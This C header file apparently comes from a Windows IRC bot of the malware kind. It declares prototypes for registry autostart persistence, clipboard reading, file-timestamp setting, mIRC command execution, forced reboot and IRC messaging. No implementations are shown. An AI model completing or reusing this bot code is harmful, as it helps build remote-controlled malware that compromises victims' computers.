#define SHTDN_REASON_MAJOR_SYSTEM	0x00050000 // ripped from reason.h
#define SHTDN_REASON_MINOR_HUNG		0x00000005

#define SHUTDOWN_SYSTEM_HUNG		(SHTDN_REASON_MAJOR_SYSTEM|SHTDN_REASON_MINOR_HUNG) // for XP,2k only ignored on 9x
#define EWX_SYSTEM_REBOOT			(EWX_REBOOT | EWX_FORCE)
#define EWX_FORCE_SHUTDOWN			(EWX_SHUTDOWN | EWX_POWEROFF | EWX_FORCE)


//char *replacestr(char *str, char *oldstr, char *newstr);
char *replacestr(char *str, const char *substr, const char *repstr);
int Split(char *inStr, void *saveArray);
void initskip(char *s, int len, int skip[1024]);
int lstrindex(char c);
char *lstrstr(char *s, char *t);
char *PrintError(char *msg);
char *GetClipboardText(void);
BOOL mirccmd(char *cmd);
void SetFileTime(char *Filename);
DWORD CreateProc(char *file, char *param);
BOOL Reboot(void);
void uninstall(void);
char *GetIP(SOCKET sock);
USHORT checksum(USHORT *buffer, int size); 
unsigned long ResolveAddress(char *szHost);
void AutoStartRegs(char *nfilename);
DWORD WINAPI AutoRegistry(LPVOID param);
void irc_sendv(SOCKET sock, char *msg, ...);
void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay=FALSE);


//AUTOSTART autostart[];

typedef struct AUTOSTART
{
	HKEY hkey;
	LPCTSTR subkey;

} AUTOSTART;
#ifndef NO_IDENT
DWORD WINAPI IdentThread(LPVOID param);
#endif